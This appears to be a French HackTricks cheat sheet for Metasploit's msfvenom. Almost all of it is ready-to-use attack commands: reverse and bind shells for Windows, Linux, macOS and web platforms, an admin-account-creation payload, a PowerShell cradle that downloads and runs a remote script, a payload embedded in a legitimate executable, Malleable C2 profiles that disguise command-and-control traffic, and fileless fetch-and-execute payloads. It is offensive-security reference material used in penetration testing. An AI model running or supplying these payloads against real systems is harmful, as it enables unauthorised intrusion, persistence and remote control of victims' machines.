# MSFVenom - Fiche mémo

{{#include ../../banners/hacktricks-training.md}}

---

## Bases de msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Utilisez `-a` pour sélectionner l’architecture du payload et `--platform` pour sélectionner sa plateforme cible.<sup>[[1]](#references)</sup>

## Liste
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Ces commandes listent les modules de payload et d’encoder disponibles dans le framework installé.<sup>[[1]](#references)</sup>

## Paramètres courants lors de la création d’un shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Les flags indiqués ici sélectionnent les caractères interdits, le format de sortie, l’encoder et le nombre d’itérations d’encodage.<sup>[[1]](#references)</sup>

## Traffic shaping HTTP(S) de Meterpreter

Metasploit 6.5 a ajouté l’option `MALLEABLEC2` aux payloads reverse HTTP(S) Meterpreter staged et stageless. Le profile peut modifier les URIs, les user agents, les headers des requêtes/réponses, le placement du connection-ID ainsi que les body encodings/wrappers pris en charge. Le payload généré et son handler doivent tous deux charger le **même profile local**. La requête initiale d’un payload staged pour le stage Meterpreter n’est pas façonnée ; préférez donc un payload stageless tel que `windows/x64/meterpreter_reverse_https` lorsque la première requête doit également correspondre au profile.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Configurez le handler correspondant avec le même payload et le même profil :<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Seules les directives documentées comme étant implémentées affectent le trafic ; les blocs de profil non pris en charge peuvent être analysés correctement sans avoir d’effet.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Créer un utilisateur
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Exécuter une commande**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **L'encodage n'est pas de l'évasion AV :** les encodeurs tels que `x86/shikata_ga_nai` sont principalement utiles pour respecter les contraintes liées aux caractères interdits. L'encodage répété n'est pas une technique fiable d'évasion AV.<sup>[[1]](#references)</sup>

### Intégré dans un exécutable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **Payloads MAC**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Charges utiles basées sur le Web**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads en langage de script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Les Fetch payloads produisent une commande qui demande à un utilitaire disponible sur la cible de télécharger et d’exécuter un payload natif sous-jacent. Leurs noms suivent le format `cmd/<platform>/<fetch-protocol>/<served-payload>` ; des adapters HTTP(S), SMB et TFTP sont disponibles, les choix du downloader dépendant de la plateforme cible.<sup>[[2]](#references)</sup>

Par exemple, générez une commande Linux `wget` qui récupère un payload Meterpreter x64 depuis le port 8080 et se reconnecte sur le port 4444 :<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Démarrez le **fetch handler** avec les mêmes paramètres ; il héberge l’ELF généré et démarre également le handler pour le payload Meterpreter servi :<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Les options dépendantes utiles incluent `FETCH_PIPE=true` pour générer une commande HTTP(S) plus courte lorsqu’elle est prise en charge, ainsi que `FETCH_FILELESS=shell`, `shell-search` ou `python3.8+` pour exécuter un ELF Linux depuis un descripteur de fichier anonyme. Les modes fileless nécessitent le noyau Linux 3.17 ou une version ultérieure ; inspectez l’adaptateur exact avec `msfvenom -p <FETCH_PAYLOAD> --list-options`, car les combinaisons prises en charge varient.<sup>[[2]](#references)</sup>



## References

- [1] [Comment utiliser msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Comment utiliser les Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Profils Malleable C2](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
